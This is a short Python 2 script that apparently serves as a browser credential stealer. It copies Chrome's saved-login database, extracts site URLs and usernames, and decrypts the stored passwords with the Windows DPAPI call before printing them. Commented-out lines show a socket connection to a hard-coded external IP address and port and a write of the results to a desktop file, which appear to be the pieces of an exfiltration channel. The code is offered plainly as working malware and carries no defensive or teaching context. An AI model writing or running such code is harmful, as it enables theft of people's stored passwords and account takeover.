

import os
import socket
import sqlite3
import win32crypt
import shutil

# host = '18.216.53.253'
# port = 18106

# clientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# clientsock.connect((host, port))


def run():

	database_path = os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"

	# Copy database before to query it (bypass lock errors)
	try:
		shutil.copy2(database_path, 'C:\Users\VOCFU\Desktop' + os.sep + 'tmp_db')
		database_path = 'C:\Users\VOCFU\Desktop' + os.sep + 'tmp_db'
	except Exception, e:
		print e

	# Connect to the Database
	try:
		conn = sqlite3.connect(database_path)
		cursor = conn.cursor()
	except Exception, e:
		pass

	# Get the results
	try:
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	except:
		pass

	pwdFound = []
	for result in cursor.fetchall():
		values = {}
		try:
			# Decrypt the Password
			password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
		except Exception, e:
			password = ''
		if password:
			values['Site'] = result[0]
			values['Username'] = result[1]
			values['Password'] = password
			pwdFound.append(values)
	conn.close()
	print pwdFound

	# if database_path.endswith('tmp_db'):
	# 	os.remove(database_path)

	# with open('C:\Users\VOCFU\Desktop\info.txt', "w") as f:
	# 	f.write(str(pwdFound))

	# f.close()

run()